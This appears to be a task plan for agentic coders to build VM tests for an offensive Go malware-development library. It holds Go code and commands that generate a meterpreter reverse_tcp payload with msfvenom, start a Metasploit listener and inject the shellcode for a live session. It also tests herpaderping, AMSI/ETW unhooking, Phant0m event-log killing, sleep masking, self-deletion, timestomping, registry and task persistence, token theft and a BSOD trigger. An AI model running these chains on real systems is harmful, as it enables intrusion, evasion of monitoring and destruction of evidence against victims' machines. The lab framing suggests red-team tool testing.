# Battle Test Plan — maldev Full-Stack VM Verification

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Execute every maldev technique in real VMs with real shellcode, verify effects at the binary level via x64dbg MCP, test all Caller method combinations, run a real meterpreter session, and even trigger a BSOD — then restore from snapshot.

**Architecture:** Three-VM lab (Windows10 target, Kali attack box, host orchestrator). Tests run Go harnesses on Windows, shellcode from msfvenom on Kali, verification via x64dbg MCP + VM guestcontrol. Snapshot restore between destructive tests.

**Tech Stack:** Go 1.26, VirtualBox 7.2 guestcontrol, x64dbg MCP SSE, Metasploit 6.4, msfvenom, SSH

---

## Prerequisites

- Windows10 VM at INIT snapshot (running, x64dbg installed, MCP on 50300)
- Kali VM at INIT snapshot (running, MSF + msfvenom, 192.168.56.200)
- SSH key for Kali at `/tmp/vm_kali_key` (inject if missing, port forward host:2223→guest:22)
- Test payloads in `testutil/`: marker_x64.bin, calc_x64.bin, msgbox_x64.bin, meterpreter_x64.bin

---

### Task 1: Kali SSH + msfvenom infrastructure

**Files:**
- Create: `testutil/kali_helpers.go` (cross-platform, SSH to Kali)
- Create: `testutil/kali_helpers_test.go`

- [ ] **Step 1: Create Kali SSH helper**

```go
// testutil/kali_helpers.go
package testutil

import (
    "context"
    "fmt"
    "os/exec"
    "strings"
    "testing"
    "time"
)

const (
    KaliHost = "192.168.56.200"
    KaliUser = "kali"
    KaliPass = "kali"
    KaliMSFPort = "4444"
)

// KaliSSH runs a command on Kali via SSH and returns stdout.
func KaliSSH(t *testing.T, cmd string, timeout time.Duration) string {
    t.Helper()
    ctx, cancel := context.WithTimeout(context.Background(), timeout)
    defer cancel()
    c := exec.CommandContext(ctx, "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=5",
        "-p", "2223",
        fmt.Sprintf("%s@localhost", KaliUser),
        cmd,
    )
    out, err := c.CombinedOutput()
    if err != nil {
        t.Logf("KaliSSH(%q) error: %v\nOutput: %s", cmd, err, out)
    }
    return strings.TrimSpace(string(out))
}

// KaliGenerateShellcode runs msfvenom on Kali and returns raw shellcode bytes.
func KaliGenerateShellcode(t *testing.T, payload, lhost, lport string) []byte {
    t.Helper()
    cmd := fmt.Sprintf("msfvenom -p %s LHOST=%s LPORT=%s -f raw 2>/dev/null",
        payload, lhost, lport)
    ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
    defer cancel()
    c := exec.CommandContext(ctx, "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-p", "2223",
        fmt.Sprintf("%s@localhost", KaliUser),
        cmd,
    )
    out, err := c.Output()
    if err != nil {
        t.Fatalf("msfvenom failed: %v", err)
    }
    if len(out) == 0 {
        t.Fatal("msfvenom produced empty output")
    }
    t.Logf("Generated %d bytes of %s shellcode", len(out), payload)
    return out
}

// KaliStartListener starts a Metasploit handler on Kali and returns a cleanup function.
func KaliStartListener(t *testing.T, payload, lhost, lport string) func() {
    t.Helper()
    rc := fmt.Sprintf("use exploit/multi/handler\nset PAYLOAD %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j -z\n",
        payload, lhost, lport)
    // Write resource script
    KaliSSH(t, fmt.Sprintf("echo '%s' > /tmp/test_listener.rc", rc), 10*time.Second)
    // Start msfconsole in background
    KaliSSH(t, "nohup msfconsole -q -r /tmp/test_listener.rc > /tmp/msf.log 2>&1 &", 15*time.Second)
    // Wait for handler to start
    time.Sleep(10 * time.Second)
    return func() {
        KaliSSH(t, "pkill -f msfconsole", 10*time.Second)
        time.Sleep(2 * time.Second)
    }
}

// KaliCheckSession verifies at least one Meterpreter session is open.
func KaliCheckSession(t *testing.T) bool {
    t.Helper()
    out := KaliSSH(t, "cat /tmp/msf.log | grep -c 'Meterpreter session'", 10*time.Second)
    return strings.TrimSpace(out) != "0"
}
```

- [ ] **Step 2: Verify Kali SSH is reachable**

```bash
# Setup SSH port forwarding if not active
VBoxManage controlvm kali-linux-2026.1-virtualbox-amd64 natpf1 "ssh,tcp,,2223,,22" 2>/dev/null
ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p 2223 kali@localhost "echo OK"
```

- [ ] **Step 3: Test msfvenom on Kali**

```bash
ssh -p 2223 kali@localhost "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.200 LPORT=4444 -f raw 2>/dev/null | wc -c"
# Expected: ~510 (typical staged reverse_tcp size)
```

- [ ] **Step 4: Commit**

---

### Task 2: Injection Caller Matrix — real execution on VM

**Files:**
- Create: `inject/caller_matrix_vm_test.go` (run via vm-run-tests.sh)

This extends the existing `caller_matrix_test.go` with actual verification:

- [ ] **Step 1: Write the matrix test**

Tests all 5 self-injection methods × 4 syscall methods = 20 combinations + 1 remote method × 4 = 4 = **24 total**.

Each test:
1. Builds injector with (method, syscallMethod)
2. Injects `WindowsCanaryX64` (xor eax,eax; ret)
3. For self-injection: verifies canary in process memory via `ScanProcessMemory`
4. For remote: verifies target process is alive after injection

- [ ] **Step 2: Run on Windows VM**

```bash
./scripts/vm-run-tests.sh windows "./inject/..." "-v -count=1 -run TestCallerMatrix"
```

Expected: 24 subtests, some may skip if method unsupported with a specific caller.

- [ ] **Step 3: Commit**

---

### Task 3: Evasion Caller Matrix — AMSI/ETW/Unhook × 4 callers

**Files:**
- Already created: `evasion/amsi/caller_test.go`, `evasion/etw/caller_test.go`
- Create: `evasion/unhook/caller_test.go`

- [ ] **Step 1: Add unhook caller matrix test**

```go
// evasion/unhook/caller_test.go
func TestFullUnhookCallerMatrix(t *testing.T) {
    testutil.RequireIntrusive(t)
    for _, c := range testutil.CallerMethods(t) {
        t.Run(c.Name, func(t *testing.T) {
            require.NoError(t, FullUnhook(c.Caller))
            // Verify NtAllocateVirtualMemory stub is clean
            proc := api.Ntdll.NewProc("NtAllocateVirtualMemory")
            proc.Find()
            b := (*[4]byte)(unsafe.Pointer(proc.Addr()))
            assert.Equal(t, byte(0x4C), b[0])
            assert.Equal(t, byte(0x8B), b[1])
            assert.Equal(t, byte(0xD1), b[2])
            assert.Equal(t, byte(0xB8), b[3])
        })
    }
}
```

- [ ] **Step 2: Run all evasion caller tests on VM**

```bash
./scripts/vm-run-tests.sh windows "./evasion/..." "-v -count=1 -run CallerMatrix"
```

- [ ] **Step 3: Commit**

---

### Task 4: Meterpreter end-to-end — real stager + real session

**Files:**
- Create: `c2/meterpreter/meterpreter_e2e_test.go`

- [ ] **Step 1: Write the e2e test**

```go
// Tests the full chain: msfvenom shellcode → inject → meterpreter session on Kali
func TestMeterpreterRealSession(t *testing.T) {
    testutil.RequireManual(t)
    testutil.RequireIntrusive(t)

    // 1. Generate shellcode on Kali
    sc := testutil.KaliGenerateShellcode(t,
        "windows/x64/meterpreter/reverse_tcp",
        testutil.KaliHost, testutil.KaliMSFPort)

    // 2. Start listener on Kali
    cleanup := testutil.KaliStartListener(t,
        "windows/x64/meterpreter/reverse_tcp",
        testutil.KaliHost, testutil.KaliMSFPort)
    defer cleanup()

    // 3. Inject shellcode locally
    inj, err := inject.Build().Method(inject.MethodCreateThread).Create()
    require.NoError(t, err)
    require.NoError(t, inj.Inject(sc))

    // 4. Wait and verify session on Kali
    time.Sleep(10 * time.Second)
    assert.True(t, testutil.KaliCheckSession(t), "meterpreter session must be established")
}
```

- [ ] **Step 2: Run on Windows VM with Kali listener**

```bash
# Ensure Kali is running and SSH forwarding active
./scripts/vm-run-tests.sh windows "./c2/meterpreter/..." "-v -count=1 -run TestMeterpreterRealSession"
```

- [ ] **Step 3: Test with Direct and Indirect syscalls**

```go
func TestMeterpreterDirectSyscall(t *testing.T) {
    testutil.RequireManual(t)
    testutil.RequireIntrusive(t)
    sc := testutil.KaliGenerateShellcode(t, ...)
    cleanup := testutil.KaliStartListener(t, ...)
    defer cleanup()
    inj, _ := inject.Build().Method(inject.MethodCreateThread).DirectSyscalls().Create()
    inj.Inject(sc)
    time.Sleep(10 * time.Second)
    assert.True(t, testutil.KaliCheckSession(t))
}
```

- [ ] **Step 4: Commit**

---

### Task 5: BSOD test — verify Trigger + snapshot restore

**Files:**
- Create: `system/bsod/bsod_vm_test.go`

- [ ] **Step 1: Write BSOD test harness**

The BSOD test is unique: it crashes the VM, so we verify via VM state change.

Strategy:
1. Record VM is "running"
2. Launch harness that calls bsod.Trigger()
3. Wait for VM to go to "poweroff" or "aborted" state (BSOD kills the VM)
4. Restore INIT snapshot
5. PASS if VM went down

```go
// system/bsod/bsod_harness/main.go (harness exe)
package main
import (
    "github.com/oioio-space/maldev/system/bsod"
)
func main() {
    bsod.Trigger(nil)
}
```

The test orchestrator (Go program on host):
1. Build harness on VM
2. Launch via scheduled task
3. Poll VM state every 2s
4. If state changes from "running" → BSOD worked
5. Restore snapshot INIT
6. Verify VM is running again

- [ ] **Step 2: Run BSOD test (host-side orchestrator)**

```bash
go run scripts/vm-test-bsod.go
```

- [ ] **Step 3: Verify snapshot restore worked**

```bash
VBoxManage showvminfo Windows10 --machinereadable | grep VMState
# Expected: VMState="running"
```

- [ ] **Step 4: Commit**

---

### Task 6: Herpaderping — execute hidden PE

**Files:**
- Create: `evasion/herpaderping/herpaderping_vm_test.go`

- [ ] **Step 1: Write herpaderping test**

Uses `calc_x64.bin` or `marker_x64.bin` as payload. Verifies:
1. Process was created (PID exists)
2. File on disk was overwritten (not the original payload)

```go
func TestRunWithMarker(t *testing.T) {
    testutil.RequireManual(t)
    testutil.RequireIntrusive(t)
    cfg := Config{
        PayloadPath: testutil.PayloadPath(t, "marker_x64.bin"),
    }
    require.NoError(t, Run(cfg))
    // Verify marker file was created (payload executed)
    time.Sleep(3 * time.Second)
    _, err := os.Stat(`C:\maldev_test_marker.txt`)
    assert.NoError(t, err, "marker file must exist — payload executed via herpaderping")
    os.Remove(`C:\maldev_test_marker.txt`)
}
```

- [ ] **Step 2: Run on VM**
- [ ] **Step 3: Commit**

---

### Task 7: Collection tests — screenshot, clipboard, keylog

**Files:**
- Modify: `collection/screenshot/screenshot_test.go`
- Modify: `collection/clipboard/clipboard_test.go`

- [ ] **Step 1: Screenshot test — verify PNG output**

```go
func TestCaptureReturnsValidPNG(t *testing.T) {
    data, err := Capture()
    require.NoError(t, err)
    require.True(t, len(data) > 100, "PNG must be non-trivial")
    // Verify PNG magic: 89 50 4E 47
    assert.Equal(t, byte(0x89), data[0])
    assert.Equal(t, byte(0x50), data[1])
    assert.Equal(t, byte(0x4E), data[2])
    assert.Equal(t, byte(0x47), data[3])
}
```

- [ ] **Step 2: Clipboard test — write then read**

```go
func TestReadTextRoundtrip(t *testing.T) {
    // Set clipboard text via PowerShell
    exec.Command("powershell", "-Command", "Set-Clipboard -Value 'MALDEV_CLIP_TEST'").Run()
    text, err := ReadText()
    require.NoError(t, err)
    assert.Equal(t, "MALDEV_CLIP_TEST", text)
}
```

- [ ] **Step 3: Commit**

---

### Task 8: Persistence lifecycle — registry + scheduler

**Files:**
- Modify: `persistence/registry/registry_test.go`
- Modify: `persistence/scheduler/scheduler_test.go`

- [ ] **Step 1: Registry full lifecycle test**

```go
func TestRegistryRunKeyLifecycle(t *testing.T) {
    testutil.RequireIntrusive(t)
    name := "MaldevTest_" + random.String(8)
    value := `C:\Windows\System32\notepad.exe`

    // Install
    require.NoError(t, Set(HiveCurrentUser, KeyRun, name, value))
    // Verify installed
    got, err := Get(HiveCurrentUser, KeyRun, name)
    require.NoError(t, err)
    assert.Equal(t, value, got)
    // Verify Exists
    exists, _ := Exists(HiveCurrentUser, KeyRun, name)
    assert.True(t, exists)
    // Cleanup
    require.NoError(t, Delete(HiveCurrentUser, KeyRun, name))
    exists, _ = Exists(HiveCurrentUser, KeyRun, name)
    assert.False(t, exists)
}
```

- [ ] **Step 2: Scheduler lifecycle test**

```go
func TestSchedulerLifecycle(t *testing.T) {
    testutil.RequireIntrusive(t)
    ctx := context.Background()
    task := &Task{
        Name:    "MaldevTest",
        Command: "cmd.exe",
        Args:    "/c echo test",
        Trigger: TriggerDaily,
    }
    require.NoError(t, Create(ctx, task))
    assert.True(t, Exists(ctx, "MaldevTest"))
    require.NoError(t, Delete(ctx, "MaldevTest"))
    assert.False(t, Exists(ctx, "MaldevTest"))
}
```

- [ ] **Step 3: Commit**

---

### Task 9: Cleanup tests — selfdelete, timestomp, memory wipe

**Files:**
- Modify: `cleanup/selfdelete/selfdelete_test.go`
- Modify: `cleanup/timestomp/timestomp_test.go`

- [ ] **Step 1: Selfdelete test — verify binary removed**

```go
func TestRunDeletesSelf(t *testing.T) {
    testutil.RequireManual(t)
    testutil.RequireIntrusive(t)
    // Build a copy of the test binary
    tmpExe := filepath.Join(t.TempDir(), "selfdelete_test.exe")
    // Copy current exe to temp
    data, _ := os.ReadFile(os.Args[0])
    os.WriteFile(tmpExe, data, 0755)
    // Run selfdelete on the copy (via exec)
    // Verify the copy no longer exists
}
```

- [ ] **Step 2: Timestomp test — verify times changed**

```go
func TestSetFullTimestamp(t *testing.T) {
    testutil.RequireIntrusive(t)
    f := filepath.Join(t.TempDir(), "stomp_test.txt")
    os.WriteFile(f, []byte("test"), 0644)
    epoch := time.Date(2000, 1, 1, 0, 0, 0, 0, time.UTC)
    require.NoError(t, SetFull(f, epoch, epoch, epoch))
    // Verify: stat the file and check mtime
    info, _ := os.Stat(f)
    assert.Equal(t, epoch.Year(), info.ModTime().Year())
}
```

- [ ] **Step 3: Commit**

---

### Task 10: x64dbg MCP verification of all VM tests

**Files:**
- Modify: `scripts/vm-test-x64dbg-mcp.go`

After all harnesses run, attach x64dbg to verify:

- [ ] **Step 1: Add meterpreter injection verification group**

After meterpreter injects, attach x64dbg and search for meterpreter stage bytes in RX memory.

- [ ] **Step 2: Add herpaderping verification group**

Load the herpaderping-spawned process in x64dbg, verify MZ header at base = payload, not decoy.

- [ ] **Step 3: Add persistence verification**

Verify registry key exists via `reg query` on VM.

- [ ] **Step 4: Run full x64dbg verification suite**

```bash
go run scripts/vm-test-x64dbg-mcp.go
```

- [ ] **Step 5: Commit**

---

### Task 11: Phant0m Event Log kill — verify logs stop

**Files:**
- Modify: `evasion/phant0m/phant0m_test.go`

- [ ] **Step 1: Write event log kill + verify test**

```go
func TestKillStopsEventLogging(t *testing.T) {
    testutil.RequireManual(t)
    testutil.RequireIntrusive(t)
    // 1. Write a test event to Application log
    exec.Command("eventcreate", "/T", "INFORMATION", "/ID", "999", "/L", "APPLICATION", "/D", "BEFORE_PHANT0M").Run()
    // 2. Kill event log threads
    require.NoError(t, Kill(nil))
    // 3. Try to write another event
    exec.Command("eventcreate", "/T", "INFORMATION", "/ID", "998", "/L", "APPLICATION", "/D", "AFTER_PHANT0M").Run()
    time.Sleep(2 * time.Second)
    // 4. Check: event 999 should exist, event 998 should NOT
    // (wevtutil qe Application /q:"*[System[EventID=998]]" /c:1)
}
```

- [ ] **Step 2: Test with all 4 Caller methods**
- [ ] **Step 3: Commit**

---

### Task 12: Sleep mask — verify encryption during sleep

**Files:**
- Modify: `evasion/sleepmask/sleepmask_test.go`

- [ ] **Step 1: Write sleep mask memory verification test**

```go
func TestSleepMaskEncryptsMemory(t *testing.T) {
    testutil.RequireIntrusive(t)
    // Allocate memory with known pattern
    addr, _ := windows.VirtualAlloc(0, 4096, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    buf := unsafe.Slice((*byte)(unsafe.Pointer(addr)), 4096)
    for i := range buf { buf[i] = 0xAA }

    mask := sleepmask.New(sleepmask.Region{Addr: addr, Size: 4096})
    // Run sleep in goroutine with short duration
    go mask.Sleep(500 * time.Millisecond)
    time.Sleep(100 * time.Millisecond) // Let encryption happen
    // During sleep: bytes should NOT be 0xAA (encrypted)
    encrypted := (*[4]byte)(unsafe.Pointer(addr))
    // At least one byte should differ from 0xAA
    changed := encrypted[0] != 0xAA || encrypted[1] != 0xAA
    assert.True(t, changed, "memory should be encrypted during sleep")
    // Wait for sleep to finish
    time.Sleep(600 * time.Millisecond)
    // After sleep: bytes should be back to 0xAA
    restored := (*[4]byte)(unsafe.Pointer(addr))
    assert.Equal(t, byte(0xAA), restored[0])
}
```

- [ ] **Step 2: Commit**

---

### Task 13: BOF execution — load + execute real COFF

**Files:**
- Modify: `pe/bof/bof_test.go`

- [ ] **Step 1: Build a minimal BOF test payload**

Create a minimal COFF object file (via NASM/MASM or download a known-good BOF) that calls MessageBeep or similar safe API.

- [ ] **Step 2: Test Load + Execute**

```go
func TestLoadAndExecuteRealBOF(t *testing.T) {
    testutil.RequireManual(t)
    data := testutil.LoadPayload(t, "test.o")
    bof, err := Load(data)
    require.NoError(t, err)
    _, err = bof.Execute(nil)
    require.NoError(t, err)
}
```

- [ ] **Step 3: Commit**

---

### Task 14: Token operations — steal, impersonate

**Files:**
- Modify: `win/token/token_test.go`

- [ ] **Step 1: Token steal + info test**

```go
func TestStealAndInspect(t *testing.T) {
    testutil.RequireIntrusive(t)
    // Steal own token (safe, always works)
    tok, err := Steal(os.Getpid())
    require.NoError(t, err)
    defer tok.Close()
    // Verify user details
    details, err := tok.UserDetails()
    require.NoError(t, err)
    assert.NotEmpty(t, details.Username)
    // Verify integrity level
    level, err := tok.IntegrityLevel()
    require.NoError(t, err)
    assert.Contains(t, []string{"Low", "Medium", "High", "System"}, level)
}
```

- [ ] **Step 2: Privilege manipulation test**

```go
func TestPrivilegeToggle(t *testing.T) {
    testutil.RequireIntrusive(t)
    tok, _ := Steal(os.Getpid())
    defer tok.Close()
    privs, _ := tok.Privileges()
    if len(privs) == 0 { t.Skip("no privileges") }
    // Enable all
    require.NoError(t, tok.EnableAllPrivileges())
    // Disable all
    require.NoError(t, tok.DisableAllPrivileges())
}
```

- [ ] **Step 3: Commit**

---

## Execution Order

| Phase | Tasks | Where | Destructive | Snapshot Restore |
|-------|-------|-------|-------------|-----------------|
| A | 1 (Kali infra) | Host + Kali | No | No |
| B | 2-3 (Caller matrix) | Windows VM | Yes (intrusive) | After |
| C | 4 (Meterpreter e2e) | Win + Kali | Yes | After |
| D | 5 (BSOD) | Windows VM | **CRASHES VM** | **Required** |
| E | 6-9 (Herpaderping, Collection, Persistence, Cleanup) | Windows VM | Yes | After |
| F | 10 (x64dbg verification) | Host → VM | No | No |
| G | 11-14 (Phant0m, Sleepmask, BOF, Token) | Windows VM | Yes | After |

**Total: ~100+ individual test cases across 14 tasks.**
